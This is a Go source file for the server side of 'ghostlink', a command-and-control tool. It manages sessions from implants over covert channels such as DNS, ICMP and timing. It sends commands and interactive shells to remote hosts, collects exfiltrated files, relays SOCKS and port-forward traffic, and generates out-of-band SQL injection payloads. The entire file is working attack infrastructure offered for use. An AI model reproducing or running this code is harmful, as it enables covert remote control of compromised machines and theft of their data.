package main

import (
	"bufio"
	"crypto/sha256"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"

	"github.com/byjanke/ghostlink/pkg/api"
	"github.com/byjanke/ghostlink/pkg/channel"
	"github.com/byjanke/ghostlink/pkg/crypto"
	"github.com/byjanke/ghostlink/pkg/exfil"
	"github.com/byjanke/ghostlink/pkg/forward"
	"github.com/byjanke/ghostlink/pkg/modules"
	"github.com/byjanke/ghostlink/pkg/protocol"
	"github.com/byjanke/ghostlink/pkg/shell"
	"github.com/byjanke/ghostlink/pkg/socks"
)

type ManagedSession struct {
	ID        uint32
	Channel   channel.Channel
	Remote    interface{}
	CryptoSes *crypto.Session
	Shell     *shell.Shell
	Forwards  map[uint32]*forward.Tunnel
	SocksMap  map[uint32]net.Conn
	Active    bool
	mu        sync.Mutex
}

type SessionManager struct {
	sessions map[uint32]*ManagedSession
	mu       sync.Mutex
	nextID   uint32
	active   uint32
}

func NewSessionManager() *SessionManager {
	return &SessionManager{
		sessions: make(map[uint32]*ManagedSession),
		nextID:   1,
	}
}

func (sm *SessionManager) Add(ch channel.Channel, remote interface{}, cryptoSes *crypto.Session) *ManagedSession {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	id := sm.nextID
	sm.nextID++
	s := &ManagedSession{
		ID:        id,
		Channel:   ch,
		Remote:    remote,
		CryptoSes: cryptoSes,
		Forwards:  make(map[uint32]*forward.Tunnel),
		SocksMap:  make(map[uint32]net.Conn),
		Active:    true,
	}
	sm.sessions[id] = s
	if sm.active == 0 {
		sm.active = id
	}
	return s
}

func (sm *SessionManager) Remove(id uint32) {
	sm.mu.Lock()
	s, ok := sm.sessions[id]
	if ok {
		s.Active = false
		delete(sm.sessions, id)
		if sm.active == id {
			sm.active = 0
			for sid := range sm.sessions {
				sm.active = sid
				break
			}
		}
	}
	sm.mu.Unlock()

	if ok {
		s.Channel.Close()
		if s.Shell != nil {
			s.Shell.Close()
		}
		for _, t := range s.Forwards {
			t.Close()
		}
		for _, c := range s.SocksMap {
			c.Close()
		}
	}
}

func (sm *SessionManager) Get(id uint32) *ManagedSession {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	return sm.sessions[id]
}

func (sm *SessionManager) Active() *ManagedSession {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	if s, ok := sm.sessions[sm.active]; ok {
		return s
	}
	return nil
}

func (sm *SessionManager) SetActive(id uint32) bool {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	if _, ok := sm.sessions[id]; ok {
		sm.active = id
		return true
	}
	return false
}

func (sm *SessionManager) List() []*ManagedSession {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	var list []*ManagedSession
	for _, s := range sm.sessions {
		list = append(list, s)
	}
	return list
}

func main() {
	addr := flag.String("addr", "0.0.0.0:16353", "listen address")
	channelType := flag.String("channel", "dns", "channel type: dns, http, icmp, ip_id, timing, packet_size, tcp_isn, websocket, doh")
	key := flag.String("key", "", "pre-shared key (empty = no encryption)")
	ecdhe := flag.Bool("ecdhe", false, "automatic ECDH key exchange")
	domain := flag.String("domain", "", "authoritative domain for DNS (enables auth DNS mode)")
	apiAddr := flag.String("api", "", "REST API listen address (e.g. 127.0.0.1:8888)")
	exfilDir := flag.String("exfil-dir", "./exfiltrated", "directory to save exfiltrated files")
	flag.Parse()

	if *exfilDir != "" {
		os.MkdirAll(*exfilDir, 0755)
	}

	if *domain != "" && *channelType == "dns" {
		runAuthDNS(*domain, *key, *ecdhe, *addr)
		return
	}

	mode := "plain"
	if *ecdhe {
		mode = "ECDHE"
	} else if *key != "" {
		mode = "PSK"
	}

	fmt.Printf("ghostlink v1.0 | %s | %s | %s | proto v%d\n", *channelType, *addr, mode, protocol.ProtocolVersion)
	fmt.Println("[*] waiting for connections...")

	listener := channel.NewListener(channel.ChannelType(*channelType))
	if listener == nil {
		log.Fatalf("unknown channel: %s", *channelType)
	}
	if err := listener.Listen(*addr); err != nil {
		log.Fatalf("listen: %v", err)
	}
	defer listener.Close()

	mgr := NewSessionManager()
	modRegistry := modules.NewRegistry()

	if *apiAddr != "" {
		apiProvider := &c2APIProvider{mgr: mgr, modRegistry: modRegistry}
		apiServer := api.NewServer(*apiAddr, apiProvider)
		if err := apiServer.Start(); err != nil {
			log.Printf("[-] api: %v", err)
		} else {
			fmt.Printf("[*] REST API on %s\n", *apiAddr)
			defer apiServer.Close()
		}
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go interactiveConsole(mgr, modRegistry, *exfilDir)

	go func() {
		for {
			ch, remote, err := listener.Accept()
			if err != nil {
				log.Printf("accept: %v", err)
				continue
			}
			fmt.Printf("\n[+] session from %v\n", remote)

			go func() {
				cryptoSes := setupCrypto(ch, *key, *ecdhe)
				s := mgr.Add(ch, remote, cryptoSes)
				fmt.Printf("[+] session #%d registered\n", s.ID)
				fmt.Print("c2> ")
				handleSession(s, mgr, *exfilDir)
				mgr.Remove(s.ID)
				fmt.Printf("[-] session #%d closed\n", s.ID)
				fmt.Print("c2> ")
			}()
		}
	}()

	<-sigCh
	fmt.Println("\n[*] shutting down...")
}

func setupCrypto(ch channel.Channel, key string, ecdhe bool) *crypto.Session {
	if ecdhe {
		sk, err := channel.ServerHandshake(ch)
		if err != nil {
			fmt.Printf("[-] handshake failed: %v\n", err)
			return nil
		}
		ses, err := crypto.NewSession(sk)
		if err != nil {
			fmt.Printf("[-] crypto session: %v\n", err)
			return nil
		}
		fmt.Println("[+] ECDH key exchange complete")
		return ses
	}
	if key != "" {
		h := sha256.Sum256([]byte(key))
		ses, err := crypto.NewSession(h[:])
		if err != nil {
			return nil
		}
		return ses
	}
	return nil
}

func runAuthDNS(domain, key string, ecdhe bool, addr string) {
	fmt.Printf("ghostlink auth-dns v1.0 | domain: %s | %s\n", domain, addr)
	fmt.Println("[*] authoritative DNS server starting...")

	srv := channel.NewAuthDNSServer(domain)

	srv.SetProcessor(func(data []byte) []byte {
		msg, err := protocol.Unmarshal(data)
		if err != nil {
			return nil
		}
		switch msg.Type {
		case protocol.MsgCmdReq:
			fmt.Printf("[cmd] %s\n", string(msg.Payload))
			output, err := shell.ExecCommand(string(msg.Payload))
			if err != nil {
				output = []byte(fmt.Sprintf("error: %v", err))
			}
			resp := protocol.Message{Type: protocol.MsgCmdRes, Payload: output}
			result := protocol.Marshal(resp)
			srv.SendResponse(result)
			return nil
		case protocol.MsgShellStdout:
			fmt.Print(string(msg.Payload))
		}
		return nil
	})

	if err := srv.Listen(addr); err != nil {
		log.Fatalf("auth dns: %v (try sudo for port 53)", err)
	}
	defer srv.Close()

	fmt.Println("[*] listening on UDP 53, waiting for DNS queries...")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for data := range srv.RecvData() {
			msg, err := protocol.Unmarshal(data)
			if err != nil {
				continue
			}
			switch msg.Type {
			case protocol.MsgShellStdout:
				fmt.Print(string(msg.Payload))
			case protocol.MsgCmdRes:
				fmt.Printf("[cmd] %s\n", string(msg.Payload))
			}
		}
	}()

	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Print("c2> ")
		for scanner.Scan() {
			line := scanner.Text()
			if line == "" {
				fmt.Print("c2> ")
				continue
			}
			handleC2Command(line, srv.SendResponse)
			fmt.Print("c2> ")
		}
	}()

	<-sigCh
	fmt.Println("\n[*] shutting down...")
}

func handleC2Command(line string, send func([]byte)) {
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "shell":
		msg := protocol.Message{Type: protocol.MsgShellStdin, Payload: []byte("/bin/sh -i\n")}
		send(protocol.Marshal(msg))
		fmt.Println("[*] shell spawned")
	case "exec":
		if len(parts) < 2 {
			fmt.Println("usage: exec <command>")
			return
		}
		cmd := strings.Join(parts[1:], " ")
		msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
		send(protocol.Marshal(msg))
		fmt.Printf("[*] command sent: %s\n", cmd)
	case "upload":
		if len(parts) < 3 {
			fmt.Println("usage: upload <local_path> <remote_path>")
			return
		}
		data, err := os.ReadFile(parts[1])
		if err != nil {
			fmt.Printf("[-] read file: %v\n", err)
			return
		}
		hdr := fmt.Sprintf("%s\n", parts[2])
		msg := protocol.Message{Type: protocol.MsgFilePut, Payload: append([]byte(hdr), data...)}
		send(protocol.Marshal(msg))
		fmt.Printf("[*] file sent: %s -> %s (%d bytes)\n", parts[1], parts[2], len(data))
	case "download":
		if len(parts) < 2 {
			fmt.Println("usage: download <remote_path>")
			return
		}
		msg := protocol.Message{Type: protocol.MsgFileGetReq, Payload: []byte(parts[1])}
		send(protocol.Marshal(msg))
		fmt.Printf("[*] download request: %s\n", parts[1])
	case "help":
		fmt.Println("commands: shell, exec <cmd>, upload <local> <remote>, download <remote>, exit")
	default:
		msg := protocol.Message{Type: protocol.MsgShellStdin, Payload: []byte(line + "\n")}
		send(protocol.Marshal(msg))
	}
}

func handleSession(s *ManagedSession, mgr *SessionManager, exfilDir string) {
	for s.Active {
		data, err := s.Channel.Recv()
		if err != nil {
			return
		}

		if s.CryptoSes != nil && len(data) > 0 {
			dec, err := s.CryptoSes.Decrypt(data)
			if err != nil {
				continue
			}
			data = dec
		}

		msg, err := protocol.Unmarshal(data)
		if err != nil {
			continue
		}

		switch msg.Type {
		case protocol.MsgShellStdout:
			fmt.Print(string(msg.Payload))
		case protocol.MsgShellStderr:
			fmt.Fprint(os.Stderr, string(msg.Payload))
		case protocol.MsgCmdReq:
			fmt.Printf("[cmd] %s\n", string(msg.Payload))
			output, err := shell.ExecCommand(string(msg.Payload))
			if err != nil {
				output = []byte(fmt.Sprintf("error: %v", err))
			}
			resp := protocol.Message{Type: protocol.MsgCmdRes, Payload: output}
			sessionSendMsg(s, resp)
		case protocol.MsgCmdRes:
			fmt.Printf("[result] %s\n", string(msg.Payload))
		case protocol.MsgExfilFile:
			handleExfilFile(msg, exfilDir, s)
		case protocol.MsgExfilGlob:
			handleExfilGlob(msg, exfilDir, s)
		case protocol.MsgCanaryAlert:
			fmt.Printf("[canary] alert from session #%d: %s\n", s.ID, string(msg.Payload))
		case protocol.MsgFwdData:
			handleFwdDataReceive(msg, s.Forwards)
		case protocol.MsgFwdClose:
			handleFwdClose(msg, s.Forwards)
		case protocol.MsgSocksConnect:
			go handleSocksConnect(s, msg)
		case protocol.MsgSocksData:
			handleSocksData(s, msg)
		case protocol.MsgSocksClose:
			handleSocksClose(s, msg)
		case protocol.MsgModuleResult:
			fmt.Printf("[module] %s\n", string(msg.Payload))
		case protocol.MsgPing:
			resp := protocol.Message{Type: protocol.MsgPong, StreamID: msg.StreamID}
			sessionSendMsg(s, resp)
		default:
			fmt.Printf("[recv] %s\n", string(msg.Payload))
		}
	}
}

func sanitizeFileName(name string) string {
	name = filepath.Base(name)
	if name == "." || name == "/" {
		return "unnamed"
	}
	return name
}

func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
	payload := string(msg.Payload)
	parts := strings.SplitN(payload, "\x00", 3)
	if len(parts) < 3 {
		fmt.Printf("[exfil] malformed exfil message\n")
		return
	}
	filename := sanitizeFileName(parts[0])
	sizeStr := parts[1]
	data := []byte(parts[2])
	var size int64
	fmt.Sscanf(sizeStr, "%d", &size)

	destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", filename, s.ID))
	if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
		fmt.Printf("[exfil] save error: %v\n", err)
		return
	}
	if err := os.WriteFile(destPath, data, 0644); err != nil {
		fmt.Printf("[exfil] save error: %v\n", err)
		return
	}

	fileHash := sha256.Sum256(data)
	ack := fmt.Sprintf("OK:%s:%x", filename, fileHash[:8])
	resp := protocol.Message{Type: protocol.MsgExfilAck, Payload: []byte(ack)}
	sessionSendMsg(s, resp)

	fmt.Printf("[exfil] received %s (%d bytes) -> %s [sha256:%x]\n", filename, size, destPath, fileHash[:8])
}

func handleExfilGlob(msg protocol.Message, exfilDir string, s *ManagedSession) {
	files := exfil.DecodeFileList(msg.Payload)
	fmt.Printf("[exfil-glob] received %d files from session #%d\n", len(files), s.ID)

	for _, f := range files {
		if f.Error != nil {
			fmt.Printf("  [-] %s: %v\n", f.Path, f.Error)
			continue
		}

		safePath := sanitizeFileName(f.Path)
		destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", safePath, s.ID))
		destDir := filepath.Dir(destPath)
		if err := os.MkdirAll(destDir, 0755); err != nil {
			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
			continue
		}

		if err := os.WriteFile(destPath, f.Content, 0644); err != nil {
			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
			continue
		}
		fmt.Printf("  [+] %s — %d bytes -> %s\n", f.Path, len(f.Content), destPath)
	}

	fileHash := sha256.Sum256(msg.Payload)
	ack := fmt.Sprintf("OK:%d_files:%x", len(files), fileHash[:8])
	resp := protocol.Message{Type: protocol.MsgExfilAck, Payload: []byte(ack)}
	sessionSendMsg(s, resp)
}

func handleSocksConnect(s *ManagedSession, msg protocol.Message) {
	targetAddr := string(msg.Payload)
	conn, err := socks.HandleSocksConnect(targetAddr)
	if err != nil {
		resp := protocol.Message{Type: protocol.MsgSocksClose, StreamID: msg.StreamID}
		sessionSendMsg(s, resp)
		return
	}

	s.mu.Lock()
	s.SocksMap[msg.StreamID] = conn
	s.mu.Unlock()

	socks.RelayRemote(conn, func(data []byte) {
		resp := protocol.Message{Type: protocol.MsgSocksData, StreamID: msg.StreamID, Payload: data}
		sessionSendMsg(s, resp)
	}, func() {
		s.mu.Lock()
		delete(s.SocksMap, msg.StreamID)
		s.mu.Unlock()
		resp := protocol.Message{Type: protocol.MsgSocksClose, StreamID: msg.StreamID}
		sessionSendMsg(s, resp)
	})
}

func handleSocksData(s *ManagedSession, msg protocol.Message) {
	s.mu.Lock()
	conn, ok := s.SocksMap[msg.StreamID]
	s.mu.Unlock()
	if ok {
		conn.Write(msg.Payload)
	}
}

func handleSocksClose(s *ManagedSession, msg protocol.Message) {
	s.mu.Lock()
	conn, ok := s.SocksMap[msg.StreamID]
	if ok {
		conn.Close()
		delete(s.SocksMap, msg.StreamID)
	}
	s.mu.Unlock()
}

func sessionSendMsg(s *ManagedSession, msg protocol.Message) {
	data := protocol.Marshal(msg)
	if s.CryptoSes != nil {
		enc, err := s.CryptoSes.Encrypt(data)
		if err != nil {
			return
		}
		data = enc
	}
	s.Channel.Send(data)
}

func handleFwdDataReceive(msg protocol.Message, fwds map[uint32]*forward.Tunnel) {
	t, ok := fwds[msg.StreamID]
	if !ok {
		return
	}
	parts := strings.SplitN(string(msg.Payload), ":", 2)
	if len(parts) != 2 {
		return
	}
	cid, _ := strconv.ParseUint(parts[0], 10, 32)
	t.WriteToConn(uint32(cid), []byte(parts[1]))
}

func handleFwdClose(msg protocol.Message, fwds map[uint32]*forward.Tunnel) {
	t, ok := fwds[msg.StreamID]
	if !ok {
		return
	}
	cid, _ := strconv.ParseUint(string(msg.Payload), 10, 32)
	t.CloseConn(uint32(cid))
}

func interactiveConsole(mgr *SessionManager, modRegistry *modules.Registry, exfilDir string) {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("c2> ")
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Print("c2> ")
			continue
		}

		parts := strings.Fields(line)
		switch parts[0] {
		case "sessions", "list":
			list := mgr.List()
			if len(list) == 0 {
				fmt.Println("[*] no active sessions")
			} else {
				fmt.Printf("[*] %d active session(s):\n", len(list))
				active := mgr.Active()
				for _, s := range list {
					marker := "  "
					if active != nil && s.ID == active.ID {
						marker = "* "
					}
					fmt.Printf("  %s#%d — %v\n", marker, s.ID, s.Remote)
				}
			}

		case "use", "interact":
			if len(parts) < 2 {
				fmt.Println("usage: use <session_id>")
			} else {
				id, err := strconv.ParseUint(parts[1], 10, 32)
				if err != nil {
					fmt.Println("[-] invalid session id")
				} else if mgr.SetActive(uint32(id)) {
					fmt.Printf("[*] active session: #%d\n", id)
				} else {
					fmt.Printf("[-] session #%d not found\n", id)
				}
			}

		case "kill":
			if len(parts) < 2 {
				fmt.Println("usage: kill <session_id>")
			} else {
				id, err := strconv.ParseUint(parts[1], 10, 32)
				if err != nil {
					fmt.Println("[-] invalid session id")
				} else {
					mgr.Remove(uint32(id))
					fmt.Printf("[*] session #%d killed\n", id)
				}
			}

		case "exec":
			s := mgr.Active()
			if s == nil {
				fmt.Println("[-] no active session")
			} else if len(parts) < 2 {
				fmt.Println("usage: exec <command>")
			} else {
				cmd := strings.Join(parts[1:], " ")
				msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
				sessionSendMsg(s, msg)
				fmt.Printf("[*] command sent to session #%d: %s\n", s.ID, cmd)
			}

		case "shell":
			s := mgr.Active()
			if s == nil {
				fmt.Println("[-] no active session")
			} else {
				msg := protocol.Message{Type: protocol.MsgShellStdin, Payload: []byte("/bin/sh -i\n")}
				sessionSendMsg(s, msg)
				fmt.Println("[*] shell request sent")
			}

		case "upload":
			s := mgr.Active()
			if s == nil {
				fmt.Println("[-] no active session")
			} else if len(parts) < 3 {
				fmt.Println("usage: upload <local> <remote>")
			} else {
				fileData, err := os.ReadFile(parts[1])
				if err != nil {
					fmt.Printf("[-] %v\n", err)
				} else {
					hdr := fmt.Sprintf("%s\n", parts[2])
					msg := protocol.Message{Type: protocol.MsgFilePut, Payload: append([]byte(hdr), fileData...)}
					sessionSendMsg(s, msg)
					fmt.Printf("[*] uploaded %d bytes to %s\n", len(fileData), parts[2])
				}
			}

		case "download":
			s := mgr.Active()
			if s == nil {
				fmt.Println("[-] no active session")
			} else if len(parts) < 2 {
				fmt.Println("usage: download <remote_path>")
			} else {
				msg := protocol.Message{Type: protocol.MsgFileGetReq, Payload: []byte(parts[1])}
				sessionSendMsg(s, msg)
				fmt.Printf("[*] download request: %s\n", parts[1])
			}

		case "ping":
			s := mgr.Active()
			if s == nil {
				fmt.Println("[-] no active session")
			} else {
				msg := protocol.Message{Type: protocol.MsgPing}
				sessionSendMsg(s, msg)
				fmt.Println("[*] ping sent")
			}

		case "modules":
			fmt.Println("[*] available modules:")
			fmt.Print(modRegistry.FormatList())

		case "run":
			s := mgr.Active()
			if s == nil {
				fmt.Println("[-] no active session")
			} else if len(parts) < 2 {
				fmt.Println("usage: run <module> [args...]")
			} else {
				modName := parts[1]
				modArgs := parts[2:]
				payload := modName
				if len(modArgs) > 0 {
					payload += "\x00" + strings.Join(modArgs, "\x00")
				}
				msg := protocol.Message{Type: protocol.MsgModuleExec, Payload: []byte(payload)}
				sessionSendMsg(s, msg)
				fmt.Printf("[*] module '%s' sent to session #%d\n", modName, s.ID)
			}

		case "sqli":
			if len(parts) < 3 {
				fmt.Println("usage: sqli <db> <domain> [query]")
				fmt.Println("  db: mysql, mssql, oracle, postgres")
			} else {
			gen := modules.NewSQLiPayloadGenerator()
			output, err := gen.Run(parts[1:])
				if err != nil {
					fmt.Printf("[-] %v\n", err)
				} else {
					fmt.Println(string(output))
				}
			}

		case "exfils":
			if exfilDir == "" {
				fmt.Println("[-] exfil-dir not configured")
			} else {
				entries, err := os.ReadDir(exfilDir)
				if err != nil {
					fmt.Printf("[-] %v\n", err)
				} else if len(entries) == 0 {
					fmt.Println("[*] no exfiltrated files")
				} else {
					fmt.Printf("[*] %d exfiltrated files:\n", len(entries))
					for _, e := range entries {
						info, _ := e.Info()
						fmt.Printf("  %s (%d bytes)\n", e.Name(), info.Size())
					}
				}
			}

		case "help":
			fmt.Println("session management:")
			fmt.Println("  sessions / list           — list all sessions")
			fmt.Println("  use <id>                  — switch active session")
			fmt.Println("  kill <id>                 — kill a session")
			fmt.Println("commands (on active session):")
			fmt.Println("  exec <cmd>                — execute command")
			fmt.Println("  shell                     — spawn interactive shell")
			fmt.Println("  upload <local> <remote>   — upload file")
			fmt.Println("  download <remote>         — download file")
			fmt.Println("  ping                      — ping session")
			fmt.Println("modules:")
			fmt.Println("  modules                   — list available modules")
			fmt.Println("  run <module> [args...]     — run module on active session")
			fmt.Println("exfiltration:")
			fmt.Println("  exfils                    — list exfiltrated files")
			fmt.Println("  sqli <db> <domain> [q]    — generate SQLi OOB payloads")
			fmt.Println("other:")
			fmt.Println("  exit                      — quit")

		case "exit", "quit":
			fmt.Println("[*] exiting...")
			os.Exit(0)

		default:
			s := mgr.Active()
			if s != nil {
				msg := protocol.Message{Type: protocol.MsgShellStdin, Payload: []byte(line + "\n")}
				sessionSendMsg(s, msg)
			} else {
				fmt.Println("[-] unknown command. type 'help'")
			}
		}

		fmt.Print("c2> ")
	}
}

type c2APIProvider struct {
	mgr         *SessionManager
	modRegistry *modules.Registry
}

func (p *c2APIProvider) ListSessions() []api.SessionInfo {
	list := p.mgr.List()
	var result []api.SessionInfo
	active := p.mgr.Active()
	for _, s := range list {
		isActive := active != nil && s.ID == active.ID
		result = append(result, api.SessionInfo{
			ID:     s.ID,
			Remote: fmt.Sprintf("%v", s.Remote),
			Active: isActive,
		})
	}
	return result
}

func (p *c2APIProvider) GetActiveID() uint32 {
	s := p.mgr.Active()
	if s != nil {
		return s.ID
	}
	return 0
}

func (p *c2APIProvider) SetActive(id uint32) bool {
	return p.mgr.SetActive(id)
}

func (p *c2APIProvider) KillSession(id uint32) {
	p.mgr.Remove(id)
}

func (p *c2APIProvider) ExecOnSession(id uint32, cmd string) error {
	s := p.mgr.Get(id)
	if s == nil {
		return fmt.Errorf("session #%d not found", id)
	}
	msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
	sessionSendMsg(s, msg)
	return nil
}

func (p *c2APIProvider) RunModuleOnSession(id uint32, module string, args []string) error {
	s := p.mgr.Get(id)
	if s == nil {
		return fmt.Errorf("session #%d not found", id)
	}
	payload := module
	if len(args) > 0 {
		payload += "\x00" + strings.Join(args, "\x00")
	}
	msg := protocol.Message{Type: protocol.MsgModuleExec, Payload: []byte(payload)}
	sessionSendMsg(s, msg)
	return nil
}

func (p *c2APIProvider) ListModules() []map[string]string {
	var result []map[string]string
	for _, m := range p.modRegistry.List() {
		result = append(result, map[string]string{
			"name":        m.Name(),
			"description": m.Description(),
		})
	}
	return result
}


